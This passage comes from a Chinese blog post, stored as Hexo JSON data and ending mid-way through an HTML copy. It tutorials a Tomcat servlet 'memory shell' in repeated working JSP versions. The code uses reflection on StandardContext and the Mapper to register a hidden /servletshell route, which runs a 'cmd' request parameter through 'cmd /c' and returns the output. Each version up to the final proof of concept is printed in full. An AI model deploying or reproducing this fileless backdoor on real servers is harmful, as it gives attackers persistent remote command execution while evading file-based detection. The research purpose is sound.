   }\n\n        @Override\n        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            super.doPost(req, resp);\n        }\n    }\n%>\n\n<%\n    //获取context\n    ServletContext servletContext = request.getSession().getServletContext();\n\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n    //修改状态\n    Field state=Class.forName(\"org.apache.catalina.util.LifecycleBase\").getDeclaredField(\"state\");\n    state.setAccessible(true);\n    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);\n\n    //尝试注入\n    String servletName=\"servletShell\";\n    String urlpattern=\"/servletshell\";\n    Class serletC=Servletshell.class;\n\n    Method addServlet=Class.forName(\"org.apache.catalina.core.ApplicationContext\").getDeclaredMethod(\"addServlet\", String.class, Class.class);\n    addServlet.invoke(applicationContext,servletName,serletC);\n\n    Method addServletMapping=Class.forName(\"org.apache.catalina.core.StandardContext\").getDeclaredMethod(\"addServletMapping\", String.class, String.class);\n    addServletMapping.invoke(standardContext,urlpattern,servletName);\n\n    System.out.println(standardContext.findChildren());\n%>\n```\n\n\n\n可以看到已经添加进去了，但是访问该路由却是503，并且正常页面也变成503了，猜测是破坏了内存中的结构之类的\n\n不好意思，是我sb了，没把状态修改回来。只需要在后面添加如下代码\n\n```auto\nif(state!=null){\n        state.set(standardContext,org.apache.catalina.LifecycleState.STARTED);\n    }\n```\n\n不过，访问变成了404\n\n\n\n现在来分析一下为啥没有正常访问到，在 `ApplicationFilterChain#`\\`internalDoFilter `中调用` servlet `的` service\\` 方法处打个断点\n\n\n\n可以看到这里获取到的是 `DefaultServlet` ，而不是我们注入的 `ServletShell` ，我们现在就来追踪一下这个servlet的来源，该servlet是通过 `setServlet` 方法进行赋值的，在该方法处打个断点\n\n\n\n在`ApplicationFilterFactor#createFilterChain`方法中调用该方法进行赋值\n\n\n\n继续往前追踪，在`StandardWrapperValv#invoke`可以看到\n\n\n\nservlet是 `wrapper.allocate` 的返回值，跟进一下这个方法\n\n\n\n简单看一下可知，这里是返回了 `instance` 属性的值，那么此时我们要继续追寻 `instance` 属性的来源，直接看一下 `wrapper` 是咋来的\n\n\n\n跟进 `getContainer`\n\n\n\n对应的赋值方法为 `setContainer` ，在那打个断点，然后没断下来，说明没有调用到该方法，然后看到上层的`StandardContextValve#invoke`\n\n\n\n可以看到wrapper已经被赋值了，该 `wrapper`是从 `request`中获取的，那么我们又要继续追溯 `request` 对象的来源了，看到`org.apache.catalina.connector.CoyoteAdapter#service`\n\n\n\n这里获取了 `request` 对象，然后在下面调用了`postParseRequest` 处理\n\n\n\n跟进\n\n这里算是一个关键地方，后面就是map方面的操作了\n\n\n\n跟踪到这里，也就是`org.apache.catalina.mappe.Mapper#internalMap`的时候，发现了一个关键的属性 `contextVersion`\n\n\n\n可以看到 `contextVersion`中的 `exactWrappers` 中存储了我们自定义的其他两个servlet的 `wrapper` ，但是我们动态注入进去的servlet却没有，这貌似也就解释了响应码是404的原因。那么如果我们能将需要注入的servlet的wrapper添加到这里面，就可以成功了呢？说干就干，先找一下有没有方法可以将wrapper插入进去，还真有一个 `addWrapper` 方法\n\n\n\n要使用这个方法，我们就需要获取到 `contextVersion` ，还要创建一个自定义的 `wrapper`\n\n先解决第一个问题 — 获取 `contextVersion`\n\n无意之间看到了这么一行代码\n\n\n\n然后去看了看 `contextObjectToContextVersionMap`\n\n\n\n里面果然存储了 `contextVersion` ，那么我们也就可以通过这个属性获取到 `contextVersion`,那么现在的问题就变成了获取`contextObjectToContextVersionMap` ，只要我们获取到这个mapper对象，也就可以顺理成章的获取到这个属性。所以问题又变成了获取mapper对象，这时我们看到之前说的那个关键操作点\n\n\n\n这里先获取到service属性在调用 `getMapper` 获取到 `mapper` 对象，那么我们现在就要想办法去获取到这个 `StandardService` ，后面调试了半天，到处追踪，终于看到了希望\n\n\n\n可以看到在 `ApplicationContext` 中有 `service` 这个属性，而 `ApplicationContext` 我们已经能够获取到了，所以问题圆满解决。\n\n```auto\n//获取service属性\n    Field servicef=applicationContext.getClass().getDeclaredField(\"service\");\n    servicef.setAccessible(true);\n    StandardService service=(StandardService) servicef.get(applicationContext);\n\n    //获取mapper\n    Mapper mapper=service.getMapper();\n\n    //获取contextVersion\n    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(\"contextObjectToContextVersionMap\");\n    contextObjectToContextVersionMapf.setAccessible(true);\n    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);\n    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);\n\n    //调用addWrapper方法\n    Class[] classes=mapper.getClass().getDeclaredClasses();\n    Class classt=classes[1];\n    Method addWrapper=mapper.getClass().getDeclaredMethod(\"addWrapper\", classt, String.class, Wrapper.class, boolean.class, boolean.class);\n    addWrapper.setAccessible(true);\n    addWrapper.invoke(mapper,contextVersion,\"/servletshell\",shellWrapper,false,false);\n    System.out.println(\"ook\");\n```\n\n继续看第二个问题 — 创建自定义 `wrapper`\n\n在 `StandardContext`中，存在 `createWrapper` 方法，我们可以通过该方法来创建自定义的 `wrapper`\n\n\n\n```auto\n//创建自定义wrapper\n    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();\n    shellWrapper.setServlet(shell);\n    shellWrapper.setServletClass(shell.getClass().getName());\n```\n\n然后我们组合一下\n\n```auto\n<%@ page import=\"java.io.ByteArrayOutputStream\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.io.Writer\" %>\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.lang.reflect.Method\" %>\n<%@ page import=\"org.apache.catalina.core.StandardWrapper\" %>\n<%@ page import=\"org.apache.catalina.core.StandardService\" %>\n<%@ page import=\"org.apache.catalina.mapper.Mapper\" %>\n<%@ page import=\"org.apache.catalina.Wrapper\" %>\n<%@ page import=\"java.util.concurrent.ConcurrentHashMap\" %>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n\n<%\n    class Servletshell extends HttpServlet {\n        @Override\n        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            String cmd=req.getParameter(\"cmd\");\n            if(cmd!=null){\n                InputStream in = Runtime.getRuntime().exec(\"cmd /c \"+cmd).getInputStream();\n\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                byte[] b = new byte[1024];\n                int a = -1;\n\n                while ((a = in.read(b)) != -1) {\n                    baos.write(b, 0, a);\n                }\n                Writer writer=resp.getWriter();\n                writer.write(new String(baos.toByteArray()));\n                writer.flush();\n            }\n        }\n\n        @Override\n        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            super.doPost(req, resp);\n        }\n    }\n%>\n\n<%\n    //获取context\n    ServletContext servletContext = request.getSession().getServletContext();\n\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n    //修改状态\n    Field state=Class.forName(\"org.apache.catalina.util.LifecycleBase\").getDeclaredField(\"state\");\n    state.setAccessible(true);\n    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);\n\n    //尝试注入\n    String servletName=\"ServletShell\";\n    String urlpattern=\"/servletshell\";\n    Class serletC=Servletshell.class;\n\n    Method addServlet=Class.forName(\"org.apache.catalina.core.ApplicationContext\").getDeclaredMethod(\"addServlet\", String.class, Class.class);\n    addServlet.invoke(applicationContext,servletName,serletC);\n\n    Method addServletMapping=Class.forName(\"org.apache.catalina.core.StandardContext\").getDeclaredMethod(\"addServletMapping\", String.class, String.class);\n    addServletMapping.invoke(standardContext,urlpattern,servletName);\n\n    Servletshell shell=new Servletshell();\n    //创建自定义wrapper\n    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();\n    shellWrapper.setServlet(shell);\n    shellWrapper.setServletClass(shell.getClass().getName());\n    //shellWrapper.addMapping(\"/servletshell\");\n\n    //获取service属性\n    Field servicef=applicationContext.getClass().getDeclaredField(\"service\");\n    servicef.setAccessible(true);\n    StandardService service=(StandardService) servicef.get(applicationContext);\n\n    //获取mapper\n    Mapper mapper=service.getMapper();\n\n    //获取contextVersion\n    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(\"contextObjectToContextVersionMap\");\n    contextObjectToContextVersionMapf.setAccessible(true);\n    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);\n    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);\n\n    //调用addWrapper方法\n    Class[] classes=mapper.getClass().getDeclaredClasses();\n    Class classt=classes[1];\n    Method addWrapper=mapper.getClass().getDeclaredMethod(\"addWrapper\", classt, String.class, Wrapper.class, boolean.class, boolean.class);\n    addWrapper.setAccessible(true);\n    addWrapper.invoke(mapper,contextVersion,\"/servletshell\",shellWrapper,false,false);\n    System.out.println(\"ook\");\n\n    if(state!=null){\n        state.set(standardContext,org.apache.catalina.LifecycleState.STARTED);\n    }\n%>\n```\n\n\n\n但是访问还是报500，看一下是否将wrapper正确添加了\n\n可以看到确实将wrapper添加了进去，但是格式不太对，回去看了一下wrapper的属性，原来是没有设置 `parent` 属性\n\n```auto\nshellWrapper.setParent(standardContext);\n```\n\n添加这一行即可，修改后的poc\n\n```auto\n<%@ page import=\"java.io.ByteArrayOutputStream\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.io.Writer\" %>\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.lang.reflect.Method\" %>\n<%@ page import=\"org.apache.catalina.core.StandardWrapper\" %>\n<%@ page import=\"org.apache.catalina.core.StandardService\" %>\n<%@ page import=\"org.apache.catalina.mapper.Mapper\" %>\n<%@ page import=\"org.apache.catalina.Wrapper\" %>\n<%@ page import=\"java.util.concurrent.ConcurrentHashMap\" %>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n\n<%\n    class Servletshell extends HttpServlet {\n        @Override\n        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            String cmd=req.getParameter(\"cmd\");\n            if(cmd!=null){\n                InputStream in = Runtime.getRuntime().exec(\"cmd /c \"+cmd).getInputStream();\n\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                byte[] b = new byte[1024];\n                int a = -1;\n\n                while ((a = in.read(b)) != -1) {\n                    baos.write(b, 0, a);\n                }\n                Writer writer=resp.getWriter();\n                writer.write(new String(baos.toByteArray()));\n                writer.flush();\n            }\n        }\n\n        @Override\n        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            super.doPost(req, resp);\n        }\n    }\n%>\n\n<%\n    //获取context\n    ServletContext servletContext = request.getSession().getServletContext();\n\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n    //修改状态\n    Field state=Class.forName(\"org.apache.catalina.util.LifecycleBase\").getDeclaredField(\"state\");\n    state.setAccessible(true);\n    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);\n\n    //尝试注入\n    String servletName=\"ServletShell\";\n    String urlpattern=\"/servletshell\";\n    Class serletC=Servletshell.class;\n\n    Method addServlet=Class.forName(\"org.apache.catalina.core.ApplicationContext\").getDeclaredMethod(\"addServlet\", String.class, Class.class);\n    addServlet.invoke(applicationContext,servletName,serletC);\n\n    Method addServletMapping=Class.forName(\"org.apache.catalina.core.StandardContext\").getDeclaredMethod(\"addServletMapping\", String.class, String.class);\n    addServletMapping.invoke(standardContext,urlpattern,servletName);\n\n    Servletshell shell=new Servletshell();\n    //创建自定义wrapper\n    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();\n    shellWrapper.setServlet(shell);\n    shellWrapper.setServletClass(shell.getClass().getName());\n    shellWrapper.setParent(standardContext);\n    //shellWrapper.addMapping(\"/servletshell\");\n\n    //获取service属性\n    Field servicef=applicationContext.getClass().getDeclaredField(\"service\");\n    servicef.setAccessible(true);\n    StandardService service=(StandardService) servicef.get(applicationContext);\n\n    //获取mapper\n    Mapper mapper=service.getMapper();\n\n    //获取contextVersion\n    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(\"contextObjectToContextVersionMap\");\n    contextObjectToContextVersionMapf.setAccessible(true);\n    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);\n    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);\n\n    //调用addWrapper方法\n    Class[] classes=mapper.getClass().getDeclaredClasses();\n    Class classt=classes[1];\n    Method addWrapper=mapper.getClass().getDeclaredMethod(\"addWrapper\", classt, String.class, Wrapper.class, boolean.class, boolean.class);\n    addWrapper.setAccessible(true);\n    addWrapper.invoke(mapper,contextVersion,\"/servletshell\",shellWrapper,false,false);\n    System.out.println(\"ook\");\n\n    if(state!=null){\n        state.set(standardContext,org.apache.catalina.LifecycleState.STARTED);\n    }\n%>\n```\n\n\n\n成功注入\n\n后面测试了一下，前面的 addservlet方法这些不需要执行就能成功，所以最终poc\n\n```auto\n<%@ page import=\"java.io.ByteArrayOutputStream\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.io.Writer\" %>\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.lang.reflect.Method\" %>\n<%@ page import=\"org.apache.catalina.core.StandardWrapper\" %>\n<%@ page import=\"org.apache.catalina.core.StandardService\" %>\n<%@ page import=\"org.apache.catalina.mapper.Mapper\" %>\n<%@ page import=\"org.apache.catalina.Wrapper\" %>\n<%@ page import=\"java.util.concurrent.ConcurrentHashMap\" %>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n\n<%\n    class Servletshell extends HttpServlet {\n        @Override\n        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            String cmd=req.getParameter(\"cmd\");\n            if(cmd!=null){\n                InputStream in = Runtime.getRuntime().exec(\"cmd /c \"+cmd).getInputStream();\n\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                byte[] b = new byte[1024];\n                int a = -1;\n\n                while ((a = in.read(b)) != -1) {\n                    baos.write(b, 0, a);\n                }\n                Writer writer=resp.getWriter();\n                writer.write(new String(baos.toByteArray()));\n                writer.flush();\n            }\n        }\n\n        @Override\n        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            super.doPost(req, resp);\n        }\n    }\n%>\n\n<%\n    //获取context\n    ServletContext servletContext = request.getSession().getServletContext();\n\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n      //创建自定义wrapper\n    Servletshell shell=new Servletshell()\n    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();\n    shellWrapper.setServlet(shell);\n    shellWrapper.setServletClass(shell.getClass().getName());\n    shellWrapper.setParent(standardContext);\n\n    //获取service属性\n    Field servicef=applicationContext.getClass().getDeclaredField(\"service\");\n    servicef.setAccessible(true);\n    StandardService service=(StandardService) servicef.get(applicationContext);\n\n    //获取mapper\n    Mapper mapper=service.getMapper();\n\n    //获取contextVersion\n    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(\"contextObjectToContextVersionMap\");\n    contextObjectToContextVersionMapf.setAccessible(true);\n    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);\n    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);\n\n    //调用addWrapper方法\n    Class[] classes=mapper.getClass().getDeclaredClasses();\n    Class classt=classes[1];\n    Method addWrapper=mapper.getClass().getDeclaredMethod(\"addWrapper\", classt, String.class, Wrapper.class, boolean.class, boolean.class);\n    addWrapper.setAccessible(true);\n    addWrapper.invoke(mapper,contextVersion,\"/servletshell\",shellWrapper,false,false);\n%>\n```\n\n简短了很多\n\n## 总结\n\n在实现servlet内存马的过程中，没有像以前一样，完全照着资料做，大部分都是自己来调试，花的时间确实要多了一些，不过感觉这样的影响更深刻，还可以有一些自己的理解，感觉很好。不过因为许多是自己的理解，所以肯定会有错误的地方，希望各位师傅不吝赐教。\n\n","slug":"Tomcat内存马—servlet型","published":1,"updated":"2024-04-17T08:43:00.803Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clv3kf7iz000ih7761ypi4rf4","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>开学鸽了一段时间，现在重新把内存马拿起来</p>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><p>servlet型的原理跟前面两种一样，也是想办法动态注册一个servlet。这里先编写一个servlet</p>\n<p>打好断点，开始调试，看看在哪进行的实例化</p>\n<p>调试发现，实例化是在<code>DefaultInstanceManager#newInstance</code> 中进行的，继续向前追踪 <code>clazz</code> 的来源</p>\n<p>这里也就知道了上文中的 <code>clazz</code> 其实就是 <code>StandardWrapper.servletClass</code> ，再继续追踪来源的时候，我看到<code>StandardWrapperValve</code> 中的 <code>context</code> ，也就是 <code>StandardContext</code> 有一个 <code>children</code> 属性</p>\n<p>直接眼前一亮，这里面存储了路由与wrapper的对应关系，那如果我们能将恶意的servlet添加进去是不是就可以实现动态注册servlet了，那么怎么才能将其添加进去呢。看到 <code>StandardContext</code> 有一个 <code>addServlet</code> 方法</p>\n<p>不过并没有具体实现，但是我们在其子类<code>ApplicationContext</code> 中找到了实现流程</p>\n<p>先判断状态，然后调用 <code>createWrapper</code> 方法去封装 <code>servlet</code> ，接着调用 <code>addChild</code> 方法将其添加到 <code>children</code> 中，那么我们是否能通过调用该方法实现servlet的动态注册呢，先试一下，简单写个demo</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page import=<span class=\"string\">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page import=<span class=\"string\">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page import=<span class=\"string\">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page import=<span class=\"string\">&quot;java.io.Writer&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page import=<span class=\"string\">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page import=<span class=\"string\">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page import=<span class=\"string\">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page import=<span class=\"string\">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page contentType=<span class=\"string\">&quot;text/html;charset=UTF-8&quot;</span> language=<span class=\"string\">&quot;java&quot;</span> %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Servletshell</span> <span class=\"keyword\">extends</span> <span class=\"title\">HttpServlet</span> </span>&#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_ invoke__\">doGet</span>(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            String cmd=req.<span class=\"title function_ invoke__\">getParameter</span>(<span class=\"string\">&quot;cmd&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(cmd!=<span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">                InputStream in = Runtime.<span class=\"title function_ invoke__\">getRuntime</span>().<span class=\"title function_ invoke__\">exec</span>(<span class=\"string\">&quot;cmd /c &quot;</span>+cmd).<span class=\"title function_ invoke__\">getInputStream</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">                ByteArrayOutputStream baos = <span class=\"keyword\">new</span> <span class=\"title class_\">ByteArrayOutputStream</span>();</span><br><span class=\"line\">                byte[] b = <span class=\"keyword\">new</span> byte[<span class=\"number\">1024</span>];</span><br><span class=\"line\">                <span class=\"keyword\">int</span> a = -<span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">while</span> ((a = in.<span class=\"title function_ invoke__\">read</span>(b)) != -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">                    baos.<span class=\"title function_ invoke__\">write</span>(b, <span class=\"number\">0</span>, a);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                Writer writer=resp.<span class=\"title function_ invoke__\">getWriter</span>();</span><br><span class=\"line\">                writer.<span class=\"title function_ invoke__\">write</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>(baos.<span class=\"title function_ invoke__\">toByteArray</span>()));</span><br><span class=\"line\">                writer.<span class=\"title function_ invoke__\">flush</span>();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_ invoke__\">doPost</span>(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            super.<span class=\"title function_ invoke__\">doPost</span>(req, resp);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    <span class=\"comment\">//获取context</span></span><br><span class=\"line\">    ServletContext servletContext = request.<span class=\"title function_ invoke__\">getSession</span>().<span class=\"title function_ invoke__\">getServletContext</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    Field appctx = servletContext.<span class=\"title function_ invoke__\">getClass</span>().<span class=\"title function_ invoke__\">getDeclaredField</span>(<span class=\"string\">&quot;context&quot;</span>);</span><br><span class=\"line\">    appctx.<span class=\"title function_ invoke__\">setAccessible</span>(<span class=\"literal\">true</span>);</span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.<span class=\"title function_ invoke__\">get</span>(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.<span class=\"title function_ invoke__\">getClass</span>().<span class=\"title function_ invoke__\">getDeclaredField</span>(<span class=\"string\">&quot;context&quot;</span>);</span><br><span class=\"line\">    stdctx.<span class=\"title function_ invoke__\">setAccessible</span>(<span class=\"literal\">true</span>);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.<span class=\"title function_ invoke__\">get</span>(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//修改状态</span></span><br><span class=\"line\">    Field state=Class.<span class=\"title function_ invoke__\">forName</span>(<span class=\"string\">&quot;org.apache.catalina.util.LifecycleBase&quot;</span>).<span class=\"title function_ invoke__\">getDeclaredField</span>(<span class=\"string\">&quot;state&quot;</span>);</span><br><span class=\"line\">    state.<span class=\"title function_ invoke__\">setAccessible</span>(<span class=\"literal\">true</span>);</span><br><span class=\"line\">    state.<span class=\"title function_ invoke__\">set</span>(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//尝试注入</span></span><br><span class=\"line\">    String servletName=<span class=\"string\">&quot;servletShell&quot;</span>;</span><br><span class=\"line\">    String servletClass=<span class=\"string\">&quot;servletShell.class&quot;</span>;</span><br><span class=\"line\">    Class serletC=Servletshell.<span class=\"keyword\">class</span>;</span><br><span class=\"line\">    Method addServlet=Class.<span class=\"title function_ invoke__\">forName</span>(<span class=\"string\">&quot;org.apache.catalina.core.ApplicationContext&quot;</span>).<span class=\"title function_ invoke__\">getDeclaredMethod</span>(<span class=\"string\">&quot;addServlet&quot;</span>, String.<span class=\"keyword\">class</span>, Class.<span class=\"keyword\">class</span>);</span><br><span class=\"line\">    <span class=\"comment\">//addServlet.setAccessible(true);</span></span><br><span class=\"line\">    addServlet.<span class=\"title function_ invoke__\">invoke</span>(applicationContext,servletName,serletC);</span><br><span class=\"line\">    System.out.<span class=\"title function_ invoke__\">println</span>(standardContext.<span class=\"title function_ invoke__\">findChildren</span>());</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>可以看到我们自定义的servlet已经插入到 <code>children</code> 里了，不过还有一个问题，这没有匹配的路由啊</p>\n<p>所以我们还得想办法将路由对应到 <code>servlet-name</code></p>\n<p>可以看到有 <code>addServletMapping</code> 方法，试试看</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span 